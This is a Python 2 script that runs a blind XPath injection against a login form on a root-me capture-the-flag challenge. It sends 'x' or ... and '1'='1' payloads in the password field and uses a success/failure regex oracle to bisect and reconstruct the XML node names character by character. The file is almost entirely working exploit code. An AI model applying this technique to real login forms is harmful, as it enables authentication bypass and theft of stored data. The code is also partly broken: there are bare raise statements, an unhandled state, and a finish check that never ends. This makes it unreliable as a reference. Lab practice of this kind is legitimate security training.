#!/usr/bin/env
import logging
import string

from enum import Enum
from leak.base import Parser, RegexParser, BaseDicotomia
from leak.leak import HTTPLeaker


logging.basicConfig()


class BooleanParser(RegexParser):
    def __init__(self):
        super(BooleanParser, self).__init__(
            pattern=r'.*((?P<success>Welcome back Steve !</h2>)|(?P<failure>Wrong credentials</p><br/>).*)'
        )


class ChallengeLeaker(HTTPLeaker):
    '''
    Reconstruct a XML file by blind XPath injection query of a login form.

    The steps are

     - set the node be the root node
     - find how many characters is composed the node name
     - extract the name by bisecting the alphabet
     - find out how many child nodes has
     - repeat the process for all the nodes
    '''
    class State(Enum):
        NODE_NAME_LENGTH  = 0
        NODE_NAME         = 1
        NODE_CHILD_NUMBER = 2

    def __init__(self):
        super(ChallengeLeaker, self).__init__(
            parser=BooleanParser()
        )

        self.bisect = BaseDicotomia(N=8)

        self.state.update({
            'state': self.State.NODE_NAME_LENGTH,
            'xpath': '/*[1]',
            'nodes': [],
        })

    def update(self):
        # here we control the state, when a bisection is finished we pass to the next
        print self._leak
        guess = self._leak['success'] is not None
        self.bisect.submit_oracle(guess)

        if self.bisect.has_finished():
            self.logger.debug('state: %s' % self.state)
            if self.state['state'] == self.State.NODE_NAME_LENGTH:
                self.state['state'] = self.State.NODE_NAME
                # we finished the deduce the node name length
                self.state['n'] = int(self.bisect.guess)

                self.logger.info('node %s with length %d' % (self.state['xpath'], self.state['n']))

                self.bisect = BaseDicotomia(alphabet=string.letters)

                self.state['idx'] = 1
                self.state['node_name'] = ''
                raise
            elif self.state['state'] == self.State.NODE_NAME:
                if self.state['n'] < self.state['idx']: # we are deducing the tag name but we haven't finished yet
                    self.state['node_name'] += self.bisect.guess
                    self.state['idx'] += 1
                    self.bisect = BaseDicotomia(alphabet=string.letters)
                else: # we have finished
                    self.logger.info('node name: %s' % self.state['node_name'])
                    raise


    def get_requests_method(self):
        return 'POST'

    def get_payload(self):
        if self.state['state'] == self.State.NODE_NAME_LENGTH:
            return 'string-length(name(%s))>%s' % (self.state['xpath'], self.bisect.guess)
        elif self.state['state'] == self.State.NODE_NAME:
            return "contains('%s',substring(name(%s),%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])

    def get_request_vulnerabile_field_value(self):
        return "x' or %s and '1'='1" % self.get_payload()

    def get_requests_data(self):
        return {
            'username': 'pippo',
            'password': self.get_request_vulnerabile_field_value(),
        }

    def get_requests_params(self):
        return {
            'action': 'login',
        }

    def has_finished(self):
        return False

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/web-serveur/ch23/'



if __name__ == '__main__':
    leaker = ChallengeLeaker()

    print leaker()